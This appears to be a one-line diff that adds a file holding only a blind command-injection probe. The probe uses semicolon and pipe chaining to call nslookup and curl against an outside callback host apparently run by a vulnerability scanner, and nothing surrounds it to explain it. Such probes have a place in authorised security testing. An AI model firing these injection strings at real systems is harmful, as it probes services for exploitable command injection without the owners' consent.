@@ -1,0 +1,1 @@
+;(nslookup -q=cname hitnopnoxjtdvd8a36.bxss.me||curl hitnopnoxjtdvd8a36.bxss.me)|(nslookup -q=cname hitnopnoxjtdvd8a36.bxss.me||curl hitnopnoxjtdvd8a36.bxss.me)&(nslookup -q=cname hitnopnoxjtdvd8a36.bxss.me||curl hitnopnoxjtdvd8a36.bxss.me)
